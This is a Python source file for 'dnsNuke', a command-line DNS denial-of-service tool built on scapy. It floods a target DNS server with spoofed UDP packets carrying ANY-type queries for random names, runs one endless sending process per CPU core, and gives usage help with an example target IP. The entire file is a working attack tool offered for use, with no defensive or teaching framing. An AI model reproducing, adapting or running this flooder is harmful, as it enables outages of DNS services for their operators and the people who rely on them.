# DNS Nuke is built to befuddle a DNS server with useless http requests
import getopt
import sys
import logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
from scapy.all import *
import time
import multiprocessing
from multiprocessing import Process
import string
from random import choice 
from string import ascii_lowercase

def usage(): 
	print (
"""
dnsNuke DNS DoS Tool 
AT ANY TIME PRESS Ctrl+C TO STOP ATTACK
Usage: python dnsNuke.py -t target_dns -i interface

	-t --target 		-Execute a DNS DoS attack agaist [host]
	-h --help		-Show the help page for dnsNuke
	-i --interface  	-The interface that you want to send the attack

Example(s):
python dnsNuke.py -t 10.1.100.1 -i enp2s0
""")
	sys.exit(0)


def sendHttp(destIp, interface): 
	s = conf.L3socket(iface=interface)
	try: 
		#packet = (IP(dst=destIp, id=1111,ttl=99)/UDP(dport=53))
		packet = (IP(src=destIp, dst=destIp, id=1111,ttl=99)/UDP(dport=53))
		sendp(packet, iface=interface, verbose = False)
		while True:
			s.send(packet / DNS(rd=1,qd=DNSQR(qname='http://www.' + ''.join((random.choice(string.letters)) for x in range(15)), qtype=255, qclass=255)))
	except KeyboardInterrupt:
		print ("Stopped the attack")
		sys.exit(0)
		quit()

def main():
	if not len(sys.argv[1:]):
		usage()
	try:
		opts, args = getopt.getopt(sys.argv[1:],"hle:t:i:",["help","target","interface"])
	except getopt.GetoptError as err:
		print (str(err))
		usage()	

	destinationIp = None
	interface     = None
	for o,a in opts: 
		if o in ("-h", "--help"):
			usage()
		elif o in ("-t","--target"):
			destinationIp = a
		elif o in ("-i","--interface"):
			interface = a
		else:
			assert False, "Unhandled option"

	if not destinationIp or not interface:
		usage()
	else:
		for cpus in range(multiprocessing.cpu_count()):
			#This section below will use all the cores on a cpu at 100%
			dnsRequests = Process(name="httpSender%i" % (cpus), target=sendHttp, args=(destinationIp, interface))
			dnsRequests.daemon = True
			dnsRequests.start()
		print ("[+] Starting attack...")
		while True:
			try:
				time.sleep(.1)
			except KeyboardInterrupt:
				print ("[+] Stopped the attack")
				dnsRequests.terminate()
				sys.exit(0)
				quit()
main()